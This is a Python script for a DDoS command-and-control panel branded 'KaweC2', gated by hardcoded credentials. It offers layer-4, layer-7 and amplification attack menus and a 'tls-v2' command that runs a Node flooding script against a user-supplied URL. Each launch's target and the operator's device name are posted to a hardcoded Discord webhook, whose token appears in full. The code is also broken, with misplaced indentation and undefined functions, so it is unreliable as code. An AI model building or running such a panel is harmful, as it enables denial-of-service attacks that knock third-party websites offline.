import time, os, sys, string, random, requests
import socket
import os
import random
import getpass
import time
import sys
import json
import platform

os.system("clear")


                                             
  
def send_discord_webhook(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


print("Type Menu To See Commands")

def si():
    print(f"         \x1b]2;Red Panel C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    print("")  
    
def main():
    print("\033[35m")

    print("""
\033[35m                          ╔╗╔═╦═══╦╗╔╗╔╦\033[32m═══╦═══╦═══╗
\033[35m                          ║║║╔╣╔═╗║║║║║║\033[32m╔══╣╔═╗║╔═╗║
\033[35m                          ║╚╝╝║║─║║║║║║║\033[32m╚══╣║─╚╩╝╔╝║
\033[35m                          ║╔╗║║╚═╝║╚╝╚╝║\033[32m╔══╣║─╔╦═╝╔╝
\033[35m                          ║║║╚╣╔═╗╠╗╔╗╔╣\033[32m╚══╣╚═╝║║╚═╗
\033[35m                          ╚╝╚═╩╝─╚╝╚╝╚╝╚\033[32m═══╩═══╩═══╝
\033[35m                            🔥 We are al\033[32mll KaweC2 🔥

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - KaweC2 vF By \033[36m@PabloTzy_ \033[35m- - - - - -║
\033[35m                ║\033[32m  - - - Type \033[36mhelp\033[35m to see the Help Menu - - - - ║
\033[35m                ╚═══════════════════════════════════════════════╝


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝""")
    while(True):
        
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88mw\x1b[38;2;0;113;133meC2\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
            layer7()
        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
            layer4()
        elif "amp" in cnc or "AMP" in cnc or "amp/game" in cnc or "amps/game" in cnc or "amps/games" in cnc or "amp/games" in cnc or "AMP/GAME" in cnc:
            amp_games()
        elif "special" in cnc or "SPECIAL" in cnc or "specialS" in cnc or "SPECIALS" in cnc:
            special()
        elif "ports" in cnc or "port" in cnc or "PORTS" in cnc or "PORT" in cnc:
            ports()
        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
            tools()
            
            elif "tls-v2" in cnc:
    try:
        url = cnc.split()[1]
        time = cnc.split()[2]
        per_second = cnc.split()[3]  # Fix variable name to per_second
        threads = cnc.split()[4]     # Fix variable name to threads
        device_name = platform.system()
        send_discord_webhook(webhook_url, f"\n\n---------------\nTLS-V2\n---------------\nTarget: {url}\nTime: {time}\nReq_Per_Sec: {per_second}\nThreads: {threads}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
        os.system(f'node TLS-V2.js {url} {time} {per_second} {threads}')  # Fix variable names here too
    except IndexError:
        print('Usage: tls-v2 <url> <time> <req_per_sec> <threads>')
        print('Example: tls-v2 https://example.com 60 10 1')

            
webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"

def login(): 
     clear() 
     user = "ddos" 
     passwd = "vvip" 
     username = input("⚡ Username: ") 
     password = getpass.getpass(prompt='⚡ Password: ') 
     if username != user or password != passwd: 
         print("") 
         print("⚡ Password Wrong LoL") 
         sys.exit(1) 
     elif username == user and password == passwd: 
         os.system("clear")
         print("\033[35m⚡ Selamat Datang Di \033[32mKawe C2 VVIP Panel") 
         main() 
     
login()            
